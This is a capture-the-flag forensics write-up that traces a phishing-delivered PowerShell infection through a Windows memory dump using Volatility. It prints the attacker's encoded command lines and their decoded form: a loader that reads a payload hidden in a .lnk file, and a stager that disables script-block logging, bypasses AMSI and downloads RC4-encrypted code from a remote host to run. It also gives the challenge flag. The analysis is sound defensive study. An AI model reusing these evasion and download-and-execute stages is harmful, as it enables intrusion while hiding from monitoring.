# Forensics

## Description

Suspicious traffic was detected from a recruiter's virtual PC. A memory dump of the offending VM was captured before it was removed from the network for imaging and analysis. Our recruiter mentioned he received an email from someone regarding their resume. A copy of the email was recovered and is provided for reference. Find and decode the source of the malware to find the flag.

## Solution

```bash
└─$ unzip -P hackthebox Reminiscent.zip
Archive:  Reminiscent.zip
   creating: reminiscent/
  inflating: reminiscent/flounder-pc-memdump.elf
  inflating: reminiscent/imageinfo.txt
  inflating: reminiscent/Resume.eml

└─$ /bin/ls -lAh ./reminiscent
total 544M
-rwxrwx--- 1 root vboxsf 544M Oct  4  2017 flounder-pc-memdump.elf
-rwxrwx--- 1 root vboxsf  861 Oct  4  2017 imageinfo.txt
-rwxrwx--- 1 root vboxsf 1.6K Sep 26 07:58 Resume.eml
```

We are provided with `imageinfo.txt` which described the memory dump profile:
```bash
└─$ cat imageinfo.txt
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027fe0a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027ffd00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2017-10-04 18:07:30 UTC+0000
     Image local date and time : 2017-10-04 11:07:30 -0700
```

`Resume.eml`:
```md
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body style="font-size: 10pt; font-family: Verdana, Geneva, sans-serif;">
    <div class="pre" style="margin: 0; padding: 0; font-family: monospace;">
        <br /> 
        Hi Frank, someone told me you would be great to review my resume.. could you have a look?<br /><br />
        <a href="http://10.10.99.55:8080/resume.zip">resume.zip</a>
    </div>
</body>
</html>
```

```bash
└─$ vol3 -f flounder-pc-memdump.elf windows.filescan.FileScan | tee filescan.log
Volatility 3 Framework 2.7.0    PDB scanning finished

Offset  Name    Size
...
0x1e1f6200      \Users\user\Desktop\resume.pdf.lnk      216
0x1e8feb70      \Users\user\Desktop\resume.pdf.lnk      216
```

Only `lnk` files were found with FileScan..

Next I tried `Malfind` for ~easy win
```bash
└─$ vol3 -f flounder-pc-memdump.elf windows.malfind.Malfind | tee malfind.log
Volatility 3 Framework 2.7.0    PDB scanning finished

PID     Process Start VPN       End VPN Tag     Protection      CommitCharge    PrivateMemory   File output     Notes   Hexdump Disasm

2044    explorer.exe    0x26a0000       0x26a0fff       VadS    PAGE_EXECUTE_READWRITE  1       1       Disabled        N/A
2248    wmpnetwk.exe    0x230000        0x23ffff        VadS    PAGE_EXECUTE_READWRITE  16      1       Disabled        N/A
496     powershell.exe  0x1e50000       0x1ecffff       VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled        N/A
496     powershell.exe  0x29e0000       0x2a5ffff       VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled        N/A
496     powershell.exe  0x2900000       0x297ffff       VadS    PAGE_EXECUTE_READWRITE  6       1       Disabled        N/A
496     powershell.exe  0x7fffff00000   0x7fffff9ffff   VadS    PAGE_EXECUTE_READWRITE  2       1       Disabled        N/A
496     powershell.exe  0x7ffffef0000   0x7ffffefffff   VadS    PAGE_EXECUTE_READWRITE  1       1       Disabled        N/A
2752    powershell.exe  0x1a570000      0x1a5effff      VadS    PAGE_EXECUTE_READWRITE  41      1       Disabled        N/A
```

Should have checked the processes first
```bash
└─$ vol3 -f flounder-pc-memdump.elf windows.pstree | tee pstree.log
Volatility 3 Framework 2.7.0    PDB scanning finished

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path

4       0       System  0xfa80006b7040  83      477     N/A     False   2017-10-04 18:04:27.000000      N/A     -       -       -
* 272   4       smss.exe        0xfa8001a63b30  2       30      N/A     False   2017-10-04 18:04:27.000000      N/A     \Device\HarddiskVolume2\Windows\System32\smss.exe       \SystemRoot\System32\smss.exe   \SystemRoot\System32\smss.exe
348     328     csrss.exe       0xfa800169bb30  9       416     0       False   2017-10-04 18:04:29.000000      N/A     \Device\HarddiskVolume2\Windows\System32\csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16  C:\Windows\system32\csrss.exe
376     328     wininit.exe     0xfa8001f63b30  3       77      0       False   2017-10-04 18:04:29.000000      N/A     \Device\HarddiskVolume2\Windows\System32\wininit.exe    wininit.exe     C:\Windows\system32\wininit.exe
* 500   376     lsm.exe 0xfa8001fffb30  11      150     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\lsm.exe        -       -
* 476   376     services.exe    0xfa8001fcdb30  11      201     0       False   2017-10-04 18:04:29.000000      N/A     \Device\HarddiskVolume2\Windows\System32\services.exe   C:\Windows\system32\services.exe C:\Windows\system32\services.exe
** 384  476     svchost.exe     0xfa8002204960  17      386     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k NetworkService C:\Windows\system32\svchost.exe
*** 432 384     winlogon.exe    0xfa8001f966d0  4       112     1       False   2017-10-04 18:04:29.000000      N/A     \Device\HarddiskVolume2\Windows\System32\winlogon.exe   winlogon.exe    C:\Windows\system32\winlogon.exe
*** 396 384     csrss.exe       0xfa8001efa500  9       283     1       False   2017-10-04 18:04:29.000000      N/A     \Device\HarddiskVolume2\Windows\System32\csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16  C:\Windows\system32\csrss.exe
**** 2772       396     conhost.exe     0xfa8000e90060  2       55      1       False   2017-10-04 18:06:58.000000      N/A     \Device\HarddiskVolume2\Windows\System32\conhost.exe    \??\C:\Windows\system32\conhost.exe       C:\Windows\system32\conhost.exe
** 868  476     svchost.exe     0xfa8002166b30  21      429     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted   C:\Windows\System32\svchost.exe
*** 2020        868     dwm.exe 0xfa80022c8060  4       72      1       False   2017-10-04 18:04:41.000000      N/A     \Device\HarddiskVolume2\Windows\System32\dwm.exe        "C:\Windows\system32\Dwm.exe"   C:\Windows\system32\Dwm.exe
** 900  476     svchost.exe     0xfa800217cb30  41      977     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k netsvcs        C:\Windows\system32\svchost.exe
** 1092 476     svchost.exe     0xfa80022bbb30  19      321     0       False   2017-10-04 18:04:31.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork  C:\Windows\system32\svchost.exe
** 1704 476     SearchIndexer.  0xfa80021b4060  16      734     0       False   2017-10-04 18:04:47.000000      N/A     \Device\HarddiskVolume2\Windows\System32\SearchIndexer.exe      C:\Windows\system32\SearchIndexer.exe /Embedding  C:\Windows\system32\SearchIndexer.exe
*** 1960        1704    SearchProtocol  0xfa80024f4b30  6       311     0       False   2017-10-04 18:04:48.000000      N/A     \Device\HarddiskVolume2\Windows\System32\SearchProtocolHost.exe "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe2_ Global\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"         C:\Windows\system32\SearchProtocolHost.exe
*** 812 1704    SearchFilterHo  0xfa80023ed550  4       92      0       False   2017-10-04 18:04:48.000000      N/A     \Device\HarddiskVolume2\Windows\System32\SearchFilterHost.exe   "C:\Windows\system32\SearchFilterHost.exe" 0 512 516 524 65536 520        C:\Windows\system32\SearchFilterHost.exe
** 2120 476     svchost.exe     0xfa8000945060  12      335     0       False   2017-10-04 18:06:32.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k secsvcs        C:\Windows\System32\svchost.exe
** 2248 476     wmpnetwk.exe    0xfa800096eb30  18      489     0       False   2017-10-04 18:06:33.000000      N/A     \Device\HarddiskVolume2\Program Files\Windows Media Player\wmpnetwk.exe "C:\Program Files\Windows Media Player\wmpnetwk.exe"      C:\Program Files\Windows Media Player\wmpnetwk.exe
** 600  476     svchost.exe     0xfa8002001b30  12      360     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k DcomLaunch     C:\Windows\system32\svchost.exe
*** 592 600     WmiPrvSE.exe    0xfa8000930b30  9       127     0       False   2017-10-04 18:06:35.000000      N/A     \Device\HarddiskVolume2\Windows\System32\wbem\WmiPrvSE.exe      C:\Windows\system32\wbem\wmiprvse.exe     C:\Windows\system32\wbem\wmiprvse.exe
*** 2924        600     WmiPrvSE.exe    0xfa8000801b30  10      204     0       False   2017-10-04 18:06:26.000000      N/A     \Device\HarddiskVolume2\Windows\System32\wbem\WmiPrvSE.exe      C:\Windows\system32\wbem\wmiprvse.exe     C:\Windows\system32\wbem\wmiprvse.exe
** 1196 476     svchost.exe     0xfa8002390620  28      333     0       False   2017-10-04 18:04:31.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation C:\Windows\system32\svchost.exe
** 664  476     VBoxService.ex  0xfa800209bb30  12      118     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\VBoxService.exe        -       -
** 1052 476     spoolsv.exe     0xfa8002294b30  13      277     0       False   2017-10-04 18:04:31.000000      N/A     \Device\HarddiskVolume2\Windows\System32\spoolsv.exe    -       -
** 728  476     svchost.exe     0xfa80020b5b30  7       270     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k RPCSS  C:\Windows\system32\svchost.exe
** 1720 476     taskhost.exe    0xfa8002245060  8       148     1       False   2017-10-04 18:04:36.000000      N/A     \Device\HarddiskVolume2\Windows\System32\taskhost.exe   -       -
** 1840 476     sppsvc.exe      0xfa8002122060  4       145     0       False   2017-10-04 18:04:37.000000      N/A     \Device\HarddiskVolume2\Windows\System32\sppsvc.exe     C:\Windows\system32\sppsvc.exe  C:\Windows\system32\sppsvc.exe
** 792  476     svchost.exe     0xfa80021044a0  21      443     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  C:\Windows\System32\svchost.exe
** 988  476     svchost.exe     0xfa80021ccb30  13      286     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\svchost.exe    C:\Windows\system32\svchost.exe -k LocalService   C:\Windows\system32\svchost.exe
* 492   376     lsass.exe       0xfa8001ff2b30  8       590     0       False   2017-10-04 18:04:30.000000      N/A     \Device\HarddiskVolume2\Windows\System32\lsass.exe      C:\Windows\system32\lsass.exe   C:\Windows\system32\lsass.exe
2044    2012    explorer.exe    0xfa80020bb630  36      926     1       False   2017-10-04 18:04:41.000000      N/A     \Device\HarddiskVolume2\Windows\explorer.exe    C:\Windows\Explorer.EXE C:\Windows\Explorer.EXE
* 496   2044    powershell.exe  0xfa800224e060  12      300     1       False   2017-10-04 18:06:58.000000      N/A     \Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); iex $r;      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
** 2752 496     powershell.exe  0xfa8000839060  20      396     1       False   2017-10-04 18:07:00.000000      N/A     \Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
* 1476  2044    VBoxTray.exe    0xfa80022622e0  13      146     1       False   2017-10-04 18:04:42.000000      N/A     \Device\HarddiskVolume2\Windows\System32\VBoxTray.exe   "C:\Windows\System32\VBoxTray.exe"        C:\Windows\System32\VBoxTray.exe
* 2812  2044    thunderbird.ex  0xfa80007e0b30  50      534     1       True    2017-10-04 18:06:24.000000      N/A     \Device\HarddiskVolume2\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe "C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe"      C:\Program Files (x86)\Mozilla Thunderbird\thunderbird.exe
```

Decode base64 blobs with Cyberchef (From Base64 (> Decode Text: UTF-16LE)) 

Smaller powershell script seems to be the initial foothold, it searches for `lnk` file in current directory, if it can't find it it changes directory to where it is, in this case Temp. Then it reads data from `3230-9676` which contains Base64 encoded payload, it's decoded and evaluated.
```powershell
$stP,$siP=3230,9676;
$f='resume.pdf.lnk';
if( -not(Test-Path $f) ){
    $x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;
    [IO.Directory]::SetCurrentDirectory($x.DirectoryName);
}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
```

I was decoding the script manually, when I got tired I just threw it to ChatGPT and MF did a fine job D:
```powershell
# Disable ScriptBlock Logging
$GroupPolicySettings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0

# Bypass AMSI (Anti-Malware Scan Interface)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | ForEach-Object {
    $_.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}

# Disable Expect100Continue
[System.Net.ServicePointManager]::Expect100Continue = 0

# Set up WebClient and headers
$WC = New-Object System.Net.WebClient
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$WC.Headers.Add('User-Agent', $u)
$WC.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$WC.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Encryption key
$K = [System.Text.Encoding]::ASCII.GetBytes('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw')

# RC4 Decryption Function
$R = {
    param($D, $K)
    $S = 0..255
    $J = 0
    0..255 | ForEach-Object {
        $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256
        $S[$_], $S[$J] = $S[$J], $S[$_]
    }
    $I = 0
    $H = 0
    $D | ForEach-Object {
        $I = ($I + 1) % 256
        $H = ($H + $S[$I]) % 256
        $S[$I], $S[$H] = $S[$H], $S[$I]
        $_ -bxor $S[($S[$I] + $S[$H]) % 256]
    }
}

# Add session cookie
$WC.Headers.Add("Cookie", "session=MCahuQVfz0yM6VBe8fzV9t9jomo=")

# Server and file path
$server = 'http://10.10.99.55:80'
$path = '/login/process.php'
$flag = 'HTB{$_j0G_y0uR_M3m0rY_$}'

# Download and decrypt data
$Data = $WC.DownloadData($server + $path)
$iv = $Data[0..3]
$Data = $Data[4..$Data.Length]
# -join [Char[]](& $R $Data ($iv + $K)) | Invoke-Expression
```

Decoding Base64 blob was enough to reveal flag, but script looked interesting.

> Flag: `HTB{$_j0G_y0uR_M3m0rY_$}`

